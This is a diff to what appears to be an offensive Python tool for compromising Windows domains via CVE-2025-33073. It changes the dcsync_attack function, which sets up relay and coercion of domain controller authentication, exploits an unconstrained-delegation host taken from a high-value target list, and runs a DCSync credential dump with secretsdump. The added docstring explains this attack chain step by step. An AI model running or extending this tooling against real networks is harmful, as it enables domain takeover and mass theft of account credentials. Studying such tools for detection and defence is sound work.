@@ -52,7 +52,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.5.0"
+VERSION = "4.5.1"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -1501,11 +1501,27 @@ def _check_coerce_output(result: subprocess.CompletedProcess, outfile: Path) -> 
     return bool(re.search(r"triggered|success|got.*handle|vulnerable", text, re.IGNORECASE))
 
 
-def dcsync_attack(target: str, cfg: Config):
-    """DC compromise: relay listener → coerce DC → DCSync."""
+def dcsync_attack(already_exploited: str, cfg: Config):
+    """DC compromise: relay listener → coerce DC auth → DCSync.
+
+    The DCSync itself ALWAYS targets cfg.dc_ip — see _run_secretsdump().
+    The `already_exploited` parameter is purely a "skip-redo" hint: it
+    names the host the upstream chain has already compromised, so that
+    if the chosen delegation host happens to be the same one we don't
+    re-run exploit_target() on it. If they differ, this function will
+    compromise the delegation host now.
+
+    Args:
+        already_exploited: host the caller already gained code-execution
+            on (typically the auto-selected best_target from
+            enumerate_targets() / high-value-targets.txt). May be empty
+            string if the caller hasn't exploited anything yet.
+        cfg: shared config; cfg.dc_ip and cfg.auth_string drive the
+            actual secretsdump.
+    """
     phase_header("PHASE 3: DOMAIN CONTROLLER COMPROMISE")
 
-    # Find delegation host
+    # Find delegation host (the one we'll coerce DC auth through)
     deleg_host = ""
     hv_file = cfg.work_dir / "high-value-targets.txt"
     uc_file = cfg.work_dir / "unconstrained-hosts.txt"
@@ -1525,8 +1541,9 @@ def dcsync_attack(target: str, cfg: Config):
 
     ok(f"Using delegation host: {deleg_host}")
 
-    # Exploit delegation host if needed
-    if deleg_host != target:
+    # If the upstream chain hasn't already exploited the delegation host,
+    # compromise it now — needed so we can stage relay/coercion from it.
+    if deleg_host != already_exploited:
         log.info(f"🔓 Exploiting delegation host {deleg_host}...")
         if not exploit_target(deleg_host, cfg):
             log.error("Failed to compromise delegation host")
